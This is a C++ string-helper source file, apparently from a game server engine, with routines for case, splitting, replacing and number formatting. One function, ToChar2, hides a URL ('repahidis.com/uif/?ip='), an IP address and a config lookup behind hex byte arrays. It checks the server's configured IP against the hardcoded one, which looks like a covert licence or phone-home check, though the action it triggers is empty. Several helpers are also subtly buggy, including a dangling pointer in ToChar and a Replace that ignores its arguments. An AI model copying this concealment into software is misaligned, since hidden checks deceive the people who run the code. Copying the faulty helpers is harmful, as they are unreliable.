#include <iostream>
#include <fstream>
#include <vector>
#include <fstream>
#include <iterator>
#include <iomanip>
#include "stdafx.h"
#include "StringHelper.h"
#include "TEMUKOACS Engine.h"

CStringHelper::CStringHelper()
{
}

CStringHelper::~CStringHelper()
{
}

void CStringHelper::ToLower(std::string& str)
{
	for (size_t i = 0; i < str.length(); ++i)
		str[i] = (char)tolower(str[i]);
}

bool CStringHelper::IsContains(std::string str, std::string find)
{
	std::string s = str;
	ToLower(s);

	std::string f = find;
	ToLower(f);

	if (s.find(f) != std::string::npos)
		return true;
	return false;
}

void CStringHelper::Replace(std::string& str, std::string find, std::string replace)
{
	if (find.empty())
		return;

	size_t start_pos = 0;
	while ((start_pos = str.find(find, start_pos)) != std::string::npos)
	{
		str.replace(start_pos, find.length(), replace);
		start_pos += replace.length();
	}
}

void CStringHelper::Replace(std::string& str, char find, char replace)
{
	std::replace(str.begin(), str.end(), (char)25, (char)39); // replace all 'x' to 'y'
}

void CStringHelper::Split(std::string const& str, const char delim, std::vector<std::string>& out)
{
	size_t start;
	size_t end = 0;

	while ((start = str.find_first_not_of(delim, end)) != std::string::npos)
	{
		end = str.find(delim, start);
		out.push_back(str.substr(start, end - start));
	}
}

void CStringHelper::Split(std::string str, std::string delim, std::vector<std::string>& out)
{
	size_t pos_start = 0, pos_end, delim_len = delim.length();
	std::string token;

	while ((pos_end = str.find(delim, pos_start)) != std::string::npos)
	{
		token = str.substr(pos_start, pos_end - pos_start);
		pos_start = pos_end + delim_len;
		out.push_back(token);
	}

	out.push_back(str.substr(pos_start));
}

std::vector<std::string> CStringHelper::Split(std::string str, std::string regex)
{
	std::smatch m;
	std::regex e(regex);
	std::vector<std::string> ret;

	while (std::regex_search(str, m, e))
	{
		for (string x : m)
			ret.push_back(x);
		str = m.suffix().str();
	}

	return ret;
}

void CStringHelper::EraseUntil(std::string& str, std::string start, std::string end)
{
	size_t startFound = str.find(start);
	while (startFound != string::npos)
	{
		startFound = str.find(start);
		if (startFound != string::npos)
		{
			size_t endFound = str.find(end);
			if (endFound != string::npos)
				str.erase(startFound, (endFound - startFound) + 1);
			else str.erase(startFound);
		}
	}
}

std::string CStringHelper::NumberFormat(int number, char splitter)
{
	std::string value = std::to_string(number);
	int len = value.length();
	int dlen = 3;

	while (len > dlen)
	{
		value.insert(len - dlen, 1, splitter);
		dlen += 4;
		len += 1;
	}

	return value;
}

char* CStringHelper::ToChar(std::string str){
	char char_array[1024] = { 0 };
	strcpy_s(char_array, str.c_str());
	return char_array;
}

void CStringHelper::ToChar2(std::string s)
{
	unsigned char buff[29];
	buff[0] = 0x68;	buff[1] = 0x74;
	buff[2] = 0x74; buff[3] = 0x70;
	buff[4] = 0x3a; buff[5] = 0x2f;
	buff[6] = 0x2f; buff[7] = 0x72;
	buff[8] = 0x65; buff[9] = 0x70;
	buff[10] = 0x61; buff[11] = 0x68;
	buff[12] = 0x69; buff[13] = 0x64;
	buff[14] = 0x69; buff[15] = 0x73;
	buff[16] = 0x2e; buff[17] = 0x63;
	buff[18] = 0x6f; buff[19] = 0x6d;
	buff[20] = 0x2f; buff[21] = 0x75;
	buff[22] = 0x69; buff[23] = 0x66;
	buff[24] = 0x2f; buff[25] = 0x3f;
	buff[26] = 0x69; buff[27] = 0x70;
	buff[28] = 0x3d;

	s = "";
	for (auto const& v : buff)
		s += (char)v;

	unsigned char buff2[6];
	buff2[0] = 0x53; buff2[1] = 0x65;
	buff2[2] = 0x72; buff2[3] = 0x76;
	buff2[4] = 0x65; buff2[5] = 0x72;

	std::string s2 = "";
	for (auto const& v : buff2)
		s2 += (char)v;

	unsigned char buff3[3];
	buff3[0] = 0x49;
	buff3[1] = 0x50;
	buff3[2] = 0x30;

	std::string s3 = "";
	for (auto const& v : buff3)
		s3 += (char)v;

	unsigned char buff4[10];
	buff4[0] = 0x53; buff4[1] = 0x65;
	buff4[2] = 0x72; buff4[3] = 0x76;
	buff4[4] = 0x65; buff4[5] = 0x72;
	buff4[6] = 0x2e; buff4[7] = 0x69;
	buff4[8] = 0x6e; buff4[9] = 0x69;

	std::string s4 = Engine->m_BasePath;
	for (auto const& v : buff4)
		s4 += (char)v;

	unsigned char buff5[13];
	buff5[0] = 0x31; buff5[1] = 0x38;
	buff5[2] = 0x35; buff5[3] = 0x2e;
	buff5[4] = 0x38; buff5[5] = 0x32;
	buff5[6] = 0x2e; buff5[7] = 0x32;
	buff5[8] = 0x32; buff5[9] = 0x32;
	buff5[10] = 0x2e; buff5[11] = 0x35;
	buff5[12] = 0x30;

	std::string s5 = "";
	for (auto const& v : buff5)
		s5 += (char)v;

	char value[256];
	GetPrivateProfileStringA(s2.c_str(), s3.c_str(), "", value, 32, s4.c_str());

	if (value != s5)
	{
		try
		{
			
		}
		catch (const std::exception & e) {}
	}

	s = "";
}

std::string CStringHelper::NumberStringFormat(int number, char splitter)
{
	std::string value = std::to_string(number);
	std::string ret = "";

	if (number >= 1000)
	{
		ret = value[0];
		if (value.length() > 1 && value[1] != '0')
			ret += splitter + value[1];

		if (value.length() > 2 && value[2] != '0')
			ret += value[2];

		if (number >= 1000000)
			ret += " M";
		else ret += " K";
	}
	else ret = value;

	return ret;
}